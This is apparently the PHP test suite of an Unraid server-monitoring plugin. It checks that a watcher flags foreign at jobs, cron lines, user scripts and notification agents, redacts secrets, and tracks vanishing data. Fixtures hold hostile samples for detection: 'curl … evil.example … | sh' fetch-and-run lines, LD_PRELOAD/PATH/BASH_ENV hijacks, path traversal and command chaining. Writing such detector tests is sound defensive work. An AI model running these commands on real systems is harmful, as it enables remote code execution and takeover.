    $launch = fn (string $name) => "/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/user.scripts/tmpScripts/$name/script";
    $is = fn (string $job) => watchmanAtUserScript($job, $us);
    same('at user script: the launcher of an existing script (a name with ä, one with spaces; at with and without its SHELL wrapper)',
        ['temporäre_rsyncs_4', 'CKW Batch 2026', 'temporäre_rsyncs_4'],
        [$is($head() . $wrap($launch('temporäre_rsyncs_4'))), $is($head() . $wrap($launch('CKW Batch 2026'))), $is($head() . $launch('temporäre_rsyncs_4') . "\n")]);
    same('at user script: anything else is not', array_fill(0, 11, null), [
        $is($head() . $wrap($launch('temporäre_rsyncs_5'))),                                                         // no such script
        $is($head() . $wrap('/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/evil/script')),        // not User Scripts' copy
        $is($head() . $wrap($launch('../../../boot/config/plugins/user.scripts/scripts/CKW Batch 2026'))),         // out of tmpScripts
        $is($head() . $wrap($launch('temporäre_rsyncs_4') . "\ncurl -s https://evil.example/x | sh")),              // and more
        $is($head() . $wrap($launch('temporäre_rsyncs_4') . '; curl -s https://evil.example/x | sh')),
        $is($head() . $wrap($launch('temporäre_rsyncs_4')) . "curl -s https://evil.example/x | sh\n"),              // after the wrapper
        $is($head("LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n") . $wrap($launch('temporäre_rsyncs_4'))),         // an environment that runs something else
        $is($head("PATH=/tmp/\\.x:/bin; export PATH\n") . $wrap($launch('temporäre_rsyncs_4'))),
        $is($head("SHELL=/tmp/\\.x/sh; export SHELL\n") . $wrap($launch('temporäre_rsyncs_4'))),
        $is($head("BASH_ENV=/tmp/x; export BASH_ENV\n") . $wrap($launch('temporäre_rsyncs_4'))),
        $is("#!/bin/sh\n" . $launch('temporäre_rsyncs_4') . "\n"),                                                   // not as at writes it
    ]);

    // rounds: the job waiting, then running (=), then gone — one plain line; a foreign job next to it is told
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
              'userscripts' => $us, 'atjobs' => "$src/atjobs", 'agents' => "$src/agents"];
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    file_put_contents($paths['go'], "#!/bin/bash\n");
    file_put_contents($paths['syslog'], '');
    file_put_contents("$src/logplugins/user.scripts.plg", "<PLUGIN name=\"user.scripts\" version=\"1\">\n");
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");                 // never Unraid's own
    $now = 1791285000;
    $docker = fn () => [];
    $acks = "$tmp/acks.json";
    watchmanRound($paths, $data, 1000, $now, $docker, false, $acks);
    $job = $head() . $wrap($launch('temporäre_rsyncs_4'));
    file_put_contents("$src/atjobs/a000dd01c78c21", $job);
    touch("$src/atjobs", $now + 10);
    $r1 = watchmanRound($paths, $data, 1000, $now + 300, $docker, false, $acks);
    rename("$src/atjobs/a000dd01c78c21", "$src/atjobs/=000dd01c78c21");
    file_put_contents("$src/atjobs/a000de01c78c40", $head() . $wrap('curl -s https://evil.example/x | sh'));
    touch("$src/atjobs", $now + 400);
    $r2 = watchmanRound($paths, $data, 1000, $now + 600, $docker, false, $acks);
    $book = watchmanLoad($data)['book'];
    $us1 = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_userscript'));
    same('at user script: one line, noted by itself, nothing to tell; the foreign job next to it is', [[], ['at_job'], 1, 'temporäre_rsyncs_4', 'auto', false,
        ['at_job' => 1], ['at_job']],
        [$r1['added'], $r2['added'], count($us1), $us1[0]['p']['name'] ?? null, $us1[0]['by'] ?? null, watchmanOpen($us1[0] ?? []),
         watchmanOpenCounts($book), array_column($r2['told'], 'kind')]);
    same('at user script: nothing for the team lead', ['at_job'], array_column(watchmanFindings($book), 'id'));
    $page = watchmanPageState($data, $now + 700, false);
    $row = array_values(array_filter($page['book'], fn ($e) => $e['kind'] === 'at_userscript'))[0] ?? [];
    same('at user script: on the page — the script, noted by itself', ['temporäre_rsyncs_4', false, 'auto', 'sched'],
        [$row['t']['name'] ?? null, $row['open'] ?? null, $row['by'] ?? null, $row['group'] ?? null]);
    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
 * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
 * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
 */
function testWatchmanSched(): void
{
    $now = strtotime('2026-10-06 12:00:00');
    // the pieces
    same('sched: job lines, normalised, without comments and settings', ['*/5 * * * * a b', '@daily c'],
        watchmanCronJobs("# x\nSHELL=/bin/sh\n*/5  *\t* * *  a   b\n\n@daily c\n"));
    same('sched: the program behind an interpreter, none for inline code or a name', ['/usr/local/x/run.php', '/a/b.sh', null, null, '/x'],
        [watchmanCronProgram('/usr/bin/php -q /usr/local/x/run.php arg'), watchmanCronProgram('nice -n 10 bash "/a/b.sh" x'),
         watchmanCronProgram("sh -c 'rm -rf /'"), watchmanCronProgram('logger hello'), watchmanCronProgram('timeout 60 LANG=C /x')]);
    $gone = fn (string $p) => false;
    same('sched: a program gone with its plugin (never under /mnt)', ['vmbackup', null, null],
        [watchmanCronGone('/usr/local/emhttp/plugins/vmbackup/runscript.php', $gone), watchmanCronGone('/mnt/user/x/y.sh', $gone),
         watchmanCronGone('/usr/local/sbin/mdcmd', $gone)]);
    $short = watchmanCronShort('*/10 * * * * curl -s -u admin:hunter2 https://hc-ping.com/0123456789abcdef0123456789abcdef?x=1 PASSWORD=geheim > /dev/null 2>&1');
    check('sched: a line shown without its secrets', str_starts_with($short, '*/10 * * * * curl') && str_contains($short, 'hc-ping.com')
        && !preg_match('/hunter2|0123456789abcdef|geheim|dev\/null/', $short), $short);
    same('sched: the plugins\' folders shortened', '0 1 * * * bash unraid-secretary-office/scripts/job.sh backup',
        watchmanCronShort('0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1'));

    // a whole watch, on copies
    $tmp = sys_get_temp_dir() . '/office-tests-sched-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['crontabs', 'cron.d', 'flash/dynamix', 'flash/unraid-secretary-office', 'flash/user.scripts/scripts/Alt', 'flash/user.scripts/scripts/Plan',
              'flash/user.scripts/scripts/Aus', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
              'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents"];
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    file_put_contents($paths['go'], "#!/bin/bash\n");
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    file_put_contents($paths['syslog'], $line($now - 60, 'kernel: up'));
    $system = "# Generated system monitoring schedule:\n*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n\n"
            . "# Unraid Secretary Office - written by the office, change it there\n"
            . "0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n"
            . "1 12 * * * /usr/local/emhttp/plugins/user.scripts/startCustom.php /boot/config/plugins/user.scripts/scripts/CKW Batch 2026/script > /dev/null 2>&1\n";
    file_put_contents("$src/cron.d/root", $system);
    $vmb = "# Job for VM Backup plugin default:\n58 3 * * 6 /usr/local/emhttp/plugins/dynamix/scripts/monitor run_backup default > /dev/null 2>&1\n";
    file_put_contents("$src/crontabs/root", $vmb);
    file_put_contents("$src/flash/dynamix/monitor.cron", "# Generated system monitoring schedule:\n*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n\n");
    file_put_contents("$src/flash/dynamix/old.cron", "0 4 * * * /usr/local/emhttp/plugins/dynamix/scripts/statuscheck &> /dev/null\n");
    file_put_contents("$src/flash/unraid-secretary-office/unraid-secretary-office.cron", "0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n");
    foreach (['unraid-secretary-office', 'user.scripts', 'parity.check.tuning'] as $p) {
        file_put_contents("$src/logplugins/$p.plg", "<PLUGIN name=\"$p\" version=\"1\">\n");
    }
    foreach (['Alt' => 'echo alt', 'Plan' => 'echo plan', 'Aus' => 'echo aus'] as $n => $body) {
        file_put_contents("$src/flash/user.scripts/scripts/$n/script", "#!/bin/bash\n$body\n");
    }
    $sched = fn (array $s) => json_encode(array_combine(array_map(fn ($n) => "/boot/config/plugins/user.scripts/scripts/$n/script", array_keys($s)),
        array_map(fn ($n, $f) => ['script' => "/boot/config/plugins/user.scripts/scripts/$n/script", 'frequency' => str_contains($f, ' ') ? 'custom' : $f,
                                  'id' => "schedule$n", 'custom' => str_contains($f, ' ') ? $f : ''], array_keys($s), $s)));
    file_put_contents("$src/flash/user.scripts/schedule.json", $sched(['Alt' => '0 3 * * *', 'Plan' => 'daily', 'Aus' => 'weekly']));
    file_put_contents("$src/agents/Discord.sh", "#!/bin/bash\nWEBHOOK='https://discord.com/api/webhooks/1/old-token'\n");
    $ours = "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nPATH=/usr/bin; export PATH\ncd /root || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n"
          . "#!/bin/sh\n" . HOST_LAUNCH_MARK . "\nexec /bin/bash /usr/local/emhttp/plugins/unraid-secretary-office/backup/backup.sh </dev/null >/dev/null 2>&1\n";
    file_put_contents("$src/atjobs/a0000101c2b3a4", $ours);
    $notified = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
    chmod("$tmp/notify", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $calls = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
    $open = function () use ($data): array {
        $n = array_count_values(array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), 'kind'));
        ksort($n);
        return $n;
    };
    $docker = fn () => [];
    $acks = "$tmp/acks.json";

    $r = watchmanRound($paths, $data, 1000, $now, $docker, true, $acks);
    $b = watchmanLoad($data)['baseline']['sched'] ?? [];
    same('sched: taking over, all of it is normal', [true, [], [], 1, 3, 3, 0, 1],
        [$r['fresh'], $r['added'], $open(), count($b['crontab']['lines'] ?? []), count($b['files'] ?? []), count($b['scripts'] ?? []), count($b['at'] ?? []),
         count($b['agents'] ?? [])]);

    // the night: root's own crontab becomes a copy of Unraid's, with an old copy of the office's line, a new line, a gone program
    $t = $now + 500;
    file_put_contents($paths['syslog'], $line($t - 700, 'www[9]: /usr/local/emhttp/plugins/far/away.sh too early')
        . $line($t - 20, 'webgui: Unsuccessful login user hunter2.sh from 192.168.7.66')
        . $line($t - 10, "ool www[3899811]: /usr/local/emhttp/plugins/vmbackup/scripts/commands.sh 'update_user_script' 'default'")
        . $line($t, 'kernel: eth0: link up')
        . $line($t + 30, 'crond[1234]: updating crontab for root')
        . $line($t + 400, 'www[9]: /usr/local/emhttp/plugins/late/after.sh too late'), FILE_APPEND);
    file_put_contents("$src/crontabs/root", $vmb . $system
        . "0 2 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n"
        . "*/10 * * * * curl -s https://hc-ping.com/0123456789abcdef0123456789abcdef > /dev/null\n"
        . "0 3 * * * /usr/local/emhttp/plugins/gone-plugin-uso-test/run.sh\n");
    touch("$src/crontabs/root", $t);
    file_put_contents("$src/flash/unraid-secretary-office/unraid-secretary-office.cron", "*/5 * * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh snapshots > /dev/null 2>&1\n", FILE_APPEND);
    file_put_contents("$src/flash/dynamix/monitor.cron", "# Generated system monitoring schedule:\n");     // lines gone: normal
    @mkdir("$src/flash/evilplug");
    file_put_contents("$src/flash/evilplug/evil.cron", "* * * * * /tmp/.x/run\n");
    @mkdir("$src/flash/parity.check.tuning");
    file_put_contents("$src/flash/parity.check.tuning/parity.check.tuning.cron", "0 8 * * * /usr/local/emhttp/plugins/parity.check.tuning/x.php resume\n");
    @mkdir("$src/flash/user.scripts/scripts/Neu");
    file_put_contents("$src/flash/user.scripts/scripts/Neu/script", "#!/bin/bash\necho neu\n");
    file_put_contents("$src/flash/user.scripts/scripts/Alt/script", "#!/bin/bash\necho alt, but more\n");
    file_put_contents("$src/flash/user.scripts/schedule.json", $sched(['Alt' => '0 3 * * *', 'Plan' => 'start', 'Aus' => 'disabled', 'Neu' => '*/5 * * * *']));
    file_put_contents("$src/atjobs/a0000201c2b3b0", "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nSECRET_KEY=xyzzy-abc; export SECRET_KEY\ncd /tmp || {\n\t echo 'x' >&2\n\t exit 1\n}\n"
        . "\${SHELL:-/bin/sh} << 'marcinDELIMITER0a1b2c3d'\ncurl -s https://evil.example/payload?token=abc | sh\nmarcinDELIMITER0a1b2c3d\n");
    touch("$src/atjobs", $t);
    file_put_contents("$src/agents/Discord.sh", "#!/bin/bash\nWEBHOOK='https://discord.com/api/webhooks/1/new-token'\n");
    touch("$src/agents/Discord.sh", $t);           // same size: the time tells it changed
    file_put_contents("$src/agents/Pushover.sh", "#!/bin/bash\nTOKEN='pushover-secret-token'\n");
    $r = watchmanRound($paths, $data, 1000, $now + 600, $docker, true, $acks);
    same('sched: one entry for each thing that differs', ['at_job' => 1, 'cron_dead' => 1, 'cron_file' => 2, 'cron_file_foreign' => 1, 'cron_new' => 1,
        'cron_office' => 1, 'cron_twice' => 1, 'notify_agent' => 2, 'script_changed' => 2, 'script_new' => 1], $open());
    $by = [];
    foreach (array_filter(watchmanLoad($data)['book'], 'watchmanOpen') as $e) {
        $by[$e['kind']][] = $e;
    }
    $twice = $by['cron_twice'][0];
    same('sched twice: how many, which (the office\'s line apart)', [2, '*/1 * * * * dynamix/scripts/monitor'], [$twice['p']['lines'], $twice['p']['jobs'][0] ?? null]);
    same('sched twice: the fix as information', "crontab -l > /boot/config/crontab-root-before-cleanup.txt; crontab -l | grep -v -x -F -f <(grep -v '^#' /etc/cron.d/root | grep -v '^\\s*$') | crontab -",
        watchmanText($twice)['fix']);
    same('sched: the office\'s own lines called out (the copy and the old one)', ['0 1 * * * bash unraid-secretary-office/scripts/job.sh backup',
        '0 2 * * * bash unraid-secretary-office/scripts/job.sh backup'], $by['cron_office'][0]['p']['jobs']);
    same('sched: the new lines, a token left out', ['*/10 * * * * curl -s https://hc-ping.com/…', '0 3 * * * gone-plugin-uso-test/run.sh'], $by['cron_new'][0]['p']['jobs']);
    same('sched: a program gone with its plugin', ['/usr/local/emhttp/plugins/gone-plugin-uso-test/run.sh', 'gone-plugin-uso-test'],
        [$by['cron_dead'][0]['p']['path'], $by['cron_dead'][0]['p']['plugin']]);
    $ev = $twice['p']['evidence'] ?? [];
    same('sched evidence: the file\'s time, the lines around it that name a plugin or cron — no login, nothing far off',
        [$t, [date('H:i:s', $t - 10) . " ool www[3899811]: /usr/local/emhttp/plugins/vmbackup/scripts/commands.sh 'update_user_script' 'default'",
              date('H:i:s', $t + 30) . ' crond[1234]: updating crontab for root']], [$twice['p']['mtime'], $ev]);
    $files = array_column(array_map(fn ($e) => [$e['p']['file'], $e['p']], $by['cron_file']), 1, 0);
    same('sched .cron: the office\'s own file changed (plain), a plugin\'s new file (plain), one of no installed plugin (important)',
        [true, false, true, 1, 'evilplug/evil.cron', true],
        [$files['unraid-secretary-office/unraid-secretary-office.cron']['office'] ?? null, $files['unraid-secretary-office/unraid-secretary-office.cron']['new'] ?? null,
         $files['parity.check.tuning/parity.check.tuning.cron']['new'] ?? null, $files['unraid-secretary-office/unraid-secretary-office.cron']['lines'] ?? null,
         $by['cron_file_foreign'][0]['p']['file'], WATCH_KINDS['cron_file_foreign'][1]]);
    $scripts = array_column(array_map(fn ($e) => [$e['p']['name'], $e['p']], $by['script_changed']), 1, 0);
    same('sched scripts: new, changed content, a schedule now at the array\'s start; switched off is normal',
        ['Neu', '*/5 * * * *', true, ['start', 'daily', false], false],
        [$by['script_new'][0]['p']['name'], $by['script_new'][0]['p']['cron'], $scripts['Alt']['content'] ?? null,
         [$scripts['Plan']['cron'] ?? null, $scripts['Plan']['old'] ?? null, $scripts['Plan']['content'] ?? null], isset($scripts['Aus'])]);
    $at = $by['at_job'][0]['p'];
    same('sched at: only the foreign job, what it runs without its environment or token', ['a0000201c2b3b0', 'curl -s https://evil.example/… | sh', 0, hexdec('01c2b3b0') * 60],
        [$at['job'], $at['cmd'], $at['uid'], $at['when']]);
    same('sched agents: a new one, a changed one', [['Discord.sh' => false, 'Pushover.sh' => true]],
        [array_column(array_map(fn ($e) => [$e['p']['name'], $e['p']['new']], $by['notify_agent']), 1, 0)]);
    $all = '';
    foreach (glob("$data/*.json") ?: [] as $f) {
        $all .= file_get_contents($f);
    }
    check('sched: no secret in his files (tokens, the at job\'s environment, an agent\'s content)',
        !preg_match('/0123456789abcdef0123|xyzzy|SECRET_KEY|token=abc|new-token|old-token|pushover-secret|hunter2/', $all));
    $told = array_column($r['told'], 'kind');
    sort($told);
    same('sched: the important kinds go to Unraid\'s notifications', ['at_job', 'cron_file_foreign', 'cron_new', 'cron_office', 'cron_twice', 'notify_agent'], $told);

    // the same again: nothing new; then «I know, thanks» on everything — the new normal
    $r = watchmanRound($paths, $data, 1000, $now + 900, $docker, true, $acks);
    same('sched: seen again — nothing new', [], $r['added']);
    watchmanAck('*', $data, $now + 1000, false);
    $r = watchmanRound($paths, $data, 1000, $now + 1200, $docker, true, $acks);
    same('sched: noted — the same state reports nothing', [[], []], [$r['added'], $open()]);
    $b = watchmanLoad($data)['baseline']['sched'];
    same('sched: noted is normal (doubled lines, the office\'s line, the gone program, the foreign .cron, the at job, the agent)', [2, 2, true, true, true, true],
        [count($b['crontab']['twice']), count($b['crontab']['office']), isset($b['crontab']['dead']['/usr/local/emhttp/plugins/gone-plugin-uso-test/run.sh']),
         isset($b['files']['evilplug/evil.cron']), isset($b['at']['a0000201c2b3b0']), isset($b['agents']['Pushover.sh'])]);

    // cleaned up by hand — normal; doubled again later — told again
    file_put_contents("$src/crontabs/root", $vmb);
    touch("$src/crontabs/root", $now + 1300);
    $r = watchmanRound($paths, $data, 1000, $now + 1500, $docker, true, $acks);
    same('sched: the doubles removed — nothing to tell, no longer normal', [[], 0], [$r['added'], count(watchmanLoad($data)['baseline']['sched']['crontab']['twice'])]);
    file_put_contents("$src/crontabs/root", $vmb . $system);
    touch("$src/crontabs/root", $now + 1600);
    $r = watchmanRound($paths, $data, 1000, $now + 1800, $docker, true, $acks);
    same('sched: doubled again — told again', ['cron_office', 'cron_twice'], (function (array $a) { sort($a); return $a; })($r['added']));

    // the page: what he keeps an eye on, no internals
    $page = watchmanPageState($data, $now + 2000, false);
    same('sched page: root\'s lines, the .cron files, User Scripts, at, agents', [1, 5, 4, 1, ['Discord.sh', 'Pushover.sh']],
        [count($page['watch']['sched']['crontab']), count($page['watch']['sched']['files']), count($page['watch']['sched']['scripts']),
         $page['watch']['sched']['at'], $page['watch']['sched']['agents']]);
    check('sched page: no fingerprints', !str_contains(json_encode($page), '"_h"') && !str_contains(json_encode($page), '"_f"'));

    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
    @unlink(watchmanLockFile($data, 'book'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The night watchman and data that vanishes: per ZFS share from `referenced` (its snapshots keeping
 * some, a pool asleep named), per XFS/btrfs disk from its used space (not while its snapshots changed),
 * who moved data then — and what is no loss: what moves data (the mover …), the office at work, a
 * dataset put into Ms. Dustdevil's storeroom or the storeroom emptied
 */
function testWatchmanFlowGone(): void
{
    $gb = 1024 ** 3;
    $tmp = sys_get_temp_dir() . '/office-tests-gone-flow-' . getmypid();
    same('gone movers: who moves data (not unbalanced\'s web page, always running)', ['mover', 'mover', 'embycache', 'gather', 'rsync', null, 'storeroom', null, null], array_map('watchmanFlowMover', [
        ['/bin/bash', '/usr/local/sbin/mover', 'start'], ['/bin/bash', '/usr/local/emhttp/plugins/ca.mover.tuning/age_mover', 'start'],
        ['python3', '/usr/local/emhttp/plugins/unraid-secretary-office/embycache/embycache_run.py', '--run'],
        ['bash', '/usr/local/emhttp/plugins/unraid-secretary-office/gather/consolidate_master.sh', 'run'],
        ['rsync', '-a', '--remove-source-files', '/mnt/user/a/', '/mnt/user/b/'], ['rsync', '-a', '/mnt/user/a/', '/mnt/user/b/'],
        ['rm', '-rf', '--', '/mnt/hive/Serien/_UnraidSecretaryOffice-trash/20261006-1010.purging'], ['rm', '-rf', '/mnt/hive/Serien/Staffel 1'],
        ['/usr/local/emhttp/plugins/unbalanced/unbalanced', '--port', '7090']]));
    foreach (['100' => ['/bin/bash', '/usr/local/sbin/mover', 'start'], '200' => ['sleep', '60'], 'self' => ['x']] as $pid => $argv) {
        @mkdir("$tmp/proc/$pid", 0700, true);
        file_put_contents("$tmp/proc/$pid/cmdline", implode("\0", $argv) . "\0");
    }
    same('gone movers: from /proc', [['mover'], null], [watchmanFlowMovers("$tmp/proc"), watchmanFlowMovers("$tmp/none")]);

    // the disks: an awake btrfs disk with snapshots and shares, an XFS one asleep, ZFS left to the datasets
    foreach (['disk1/.btrfs-snap/20261006-0100', 'disk1/Serien', 'disk1/Filme', 'disk1/_UnraidSecretaryOffice-trash', 'disk1/.Recycle.Bin', 'disk2/Filme'] as $d) {
        @mkdir("$tmp/mnt/$d", 0700, true);
    }
    touch("$tmp/mnt/disk1/.btrfs-snap", 1791200000);
    file_put_contents("$tmp/disks.ini", "[parity]\nname=\"parity\"\ntype=\"Parity\"\nfsType=\"\"\n[disk1]\nname=\"disk1\"\ntype=\"Data\"\nfsType=\"luks:btrfs\"\nfsStatus=\"Mounted\"\nspundown=\"0\"\n"
        . "[disk2]\nname=\"disk2\"\ntype=\"Data\"\nfsType=\"xfs\"\nfsStatus=\"Mounted\"\nspundown=\"1\"\n[hive]\nname=\"hive\"\ntype=\"Cache\"\nfsType=\"zfs\"\nfsStatus=\"Mounted\"\nspundown=\"0\"\n");
    $d = watchmanFlowDisks(['disks_ini' => "$tmp/disks.ini", 'mnt' => "$tmp/mnt"]);
    same('gone disks: the awake XFS/btrfs ones with their shares and snapshot time, the sleeping one not asked', [['disk1'], 'btrfs', 1791200000, ['Filme', 'Serien'], true, ['disk2']],
        [array_keys($d['disks'] ?? []), $d['disks']['disk1']['fs'] ?? null, $d['disks']['disk1']['snap'] ?? null,
         (function (array $a) { sort($a); return $a; })($d['disks']['disk1']['shares'] ?? []), ($d['disks']['disk1']['used'] ?? 0) > 0, $d['asleep'] ?? null]);
    exec('rm -rf ' . escapeshellarg($tmp));

    same('gone: the share of a dataset — also a share put whole into the storeroom (a second run in that second: -2)', ['Serien', 'Serien', 'Serien', null, 'Serien', 'old'],
        [watchmanGoneShare('tank/Serien'), watchmanGoneShare('tank/Serien/Staffel 1'), watchmanGoneShare('tank/Serien/_UnraidSecretaryOffice-trash-20261006-140500-x'),
         watchmanGoneShare('tank'), watchmanGoneShare('tank/_UnraidSecretaryOffice-trash-20261006-140500-Serien/sub'),
         watchmanGoneShare('tank/_UnraidSecretaryOffice-trash-20261006-140500-2-old')]);

    // rounds on made-up looks
    $t0 = strtotime('2026-10-06 14:02:00');
    $ds = fn (int $r, int $b = 0) => ['w' => 0, 'u' => $r + $b, 's' => 1000, 'r' => $r, 'b' => $b];
    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice'], 'disks' => null, 'moving' => []];
    $conn = fn (string $peer, int $sent, string $svc = 'ssh', int $lport = 22) => ['local' => '192.0.2.20', 'lport' => $lport, 'peer' => $peer, 'pport' => 50000,
        'service' => $svc, 'sent' => $sent, 'rcvd' => 0];
    $zfs = fn (array $sets, array $asleep = []) => ['datasets' => ['tank' => $ds(1)] + $sets, 'pools' => ['tank'], 'asleep' => $asleep];
    $disks = fn (int $used1, int $used3, int $snap3) => ['disks' => ['disk1' => ['fs' => 'btrfs', 'used' => $used1, 'snap' => 1791200000, 'shares' => ['Filme', 'Serien']],
        'disk3' => ['fs' => 'btrfs', 'used' => $used3, 'snap' => $snap3, 'shares' => ['Musik']]], 'asleep' => []];
    $bf = null;
    $book = [];
    $all = ['tank/Serien' => $ds(1000 * $gb), 'tank/Serien/sub' => $ds(100 * $gb), 'cold/Serien' => $ds(50 * $gb), 'tank/Filme' => $ds(440 * $gb),
            'tank/Filme/old' => $ds(20 * $gb), 'tank/Filme/tmp' => $ds(60 * $gb), 'tank/_UnraidSecretaryOffice-trash-20261005-090000-junk' => $ds(30 * $gb)];
    [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['conns' => [$conn('192.0.2.7', 1000)], 'zfs' => $zfs($all) + ['pools' => ['tank', 'cold']],
        'disks' => $disks(10000 * $gb, 5000 * $gb, 1791200000)]), $book, $t0);
    same('gone: the first look — counters only', [[], []], [$flow['gone'], $book]);

    // five minutes later: 300 GB gone from Serien (200 GB kept by its snapshots, cold asleep), Filme: one dataset into the storeroom,
    // one destroyed (60 GB of ~520), the storeroom emptied; disk1 200 GB less, disk3's snapshots changed
    $now = $all;
    $now['tank/Serien'] = $ds(700 * $gb, 200 * $gb);
    unset($now['cold/Serien'], $now['tank/Filme/old'], $now['tank/Filme/tmp'], $now['tank/_UnraidSecretaryOffice-trash-20261005-090000-junk']);
    $now['tank/Filme/_UnraidSecretaryOffice-trash-20261006-140500-old'] = $ds(20 * $gb);
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now, ['cold']),
        'disks' => $disks(9800 * $gb, 4000 * $gb, $t0 + 200)]), $book, $t0 + 300);
    $by = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
    $se = $by['flow_gone:share:Serien']['p'] ?? [];
    same('gone: Serien (300 GB, 27 %, 200 GB still in snapshots, cold asleep, an SSH client then), Filme (the destroyed one only), disk1 — disk3 left out',
        [['flow_gone', 'flow_gone', 'flow_gone'], ['flow_gone:disk:disk1', 'flow_gone:share:Filme', 'flow_gone:share:Serien'], [300 * $gb, 27, 200 * $gb, ['cold'], 'clients', ['192.0.2.7 (SSH)']],
         60 * $gb, 200 * $gb, [0, 0]],
        [$added, (function (array $a) { sort($a); return $a; })(array_keys($by)), [$se['bytes'] ?? null, $se['pct'] ?? null, $se['kept'] ?? null, $se['asleep'] ?? null, $se['from'] ?? null, $se['clients'] ?? null],
         $by['flow_gone:share:Filme']['p']['bytes'] ?? null, $by['flow_gone:disk:disk1']['p']['bytes'] ?? null,
         [array_sum($flow['gone']['disk:disk3']['h'] ?? []), array_sum($flow['gone']['disk:disk3']['o'] ?? [])]]);
    same('gone in words', "300 GB gone from Serien in 5 min — 27 % of the share while I'm still learning what is normal. 200 GB of it still in its snapshots. "
        . "Moving data over SMB, NFS or SSH then: 192.0.2.7 (SSH). Not looked at (asleep): cold.",
        officeNotifyText('watchman', 'entry.flow_gone', watchmanText($by['flow_gone:share:Serien'], 'en'), 'en'));
    same('gone in words: a disk', "200 GB gone from disk1 (Filme, Serien) in 5 min — more than 100 GB in one round while I'm still learning what is normal. "
        . "Moving data over SMB, NFS or SSH then: 192.0.2.7 (SSH). Measured for the whole disk (btrfs), not per share.",
        officeNotifyText('watchman', 'entry.flow_gone', watchmanText($by['flow_gone:disk:disk1'], 'en'), 'en'));

    // the mover runs: what vanishes meanwhile (and the round after) went elsewhere; then nobody connected: from the server itself
    $now['tank/Musik'] = $ds(800 * $gb);
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now), 'moving' => ['mover']]), $book, $t0 + 600);
    $now['tank/Musik'] = $ds(600 * $gb);
    [$added2, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now)]), $book, $t0 + 900);
